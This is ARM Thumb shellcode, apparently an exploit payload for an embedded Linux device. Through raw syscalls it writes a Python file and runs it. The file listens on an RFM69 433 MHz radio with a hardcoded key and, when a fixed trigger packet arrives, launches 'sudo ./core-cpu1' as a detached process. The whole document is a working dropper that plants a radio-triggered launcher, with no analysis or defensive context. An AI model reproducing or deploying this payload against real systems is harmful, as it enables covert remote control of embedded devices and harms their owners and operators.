.section .text
.global _start

_start:
    .ARM
    add  r3, pc, #1         // switch to thumb mode
    bx   r3

    .THUMB
open_file:
    mov  r7, #5             // open(const char *pathname, int flags, .../* mode_t mode */ )
    adr  r0, f_name         // load file name to open
    eor  r3, r3, r3
    strb r3, [r0, #7] 
    ldr  r1, =0x241         // (O_CREAT | O_RDWR)
    ldr  r2, =0777          // RWE permissions on all
    svc  1                  // invoke interrupt
write_file:
    mov  r7, #4             // write(int fd, const void buf[.count], size_t count);
    adr  r1, cont         // buf (r0 will contain the fd from the open() call)
    ldr  r2, =616             // count
    svc  1                  // invoke interrupt

close_file:
    mov  r7, #6             // int close(int fd)
    svc  1                  // invoke interrupt (we already have fd in r0)
python_call:                // this is resistant to optimizations for some reason
    adr  r0, prog
    adr  r1, f_name
    strb r3, [r0, #11]
    strb r3, [r1, #7]
    mov  r2, r3
    push {r0, r1, r2}
    mov  r1, sp
    mov  r7, #11
    svc  1

exit_call:
    mov  r7, #1             // void _exit(int status)
    svc 1                   // invoke interrupt (may or may not need to exit)

    eor  r7, r7, r7         // pad to align 4 bytes

f_name:
    .ascii "f123.pyA"       // file name and contents
prog:
    .ascii "/bin/pythonA"
cont:
    .ascii "import os\nimport subprocess\nfrom RFM69 import Radio, FREQ_433MHZ\nnode_id=2\nnetwork_id=100\nrecipient_id=1\nboard={'isHighPower':True,'interruptPin':18,'resetPin':29,'spiDevice':0,'encryptionKey':'abcdefghijklmnop'}\nwith Radio(FREQ_433MHZ,node_id,network_id,verbose=False,**board) as radio:\n\twhile True:\n\t\tpacket=radio.get_packet()\n\t\tif packet is not None:\n\t\t\thex_pkt=[]\n\t\t\tfor i in packet.data:\n\t\t\t\thex_str=''.join(str(hex(x)) for x in packet.data)\n\t\t\tif hex_str=='0x310x320x330x340x350x36':\n\t\t\t\tsubprocess.Popen(['sudo', './core-cpu1'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, preexec_fn=os.setsid)\n\t\t\t\texit()"
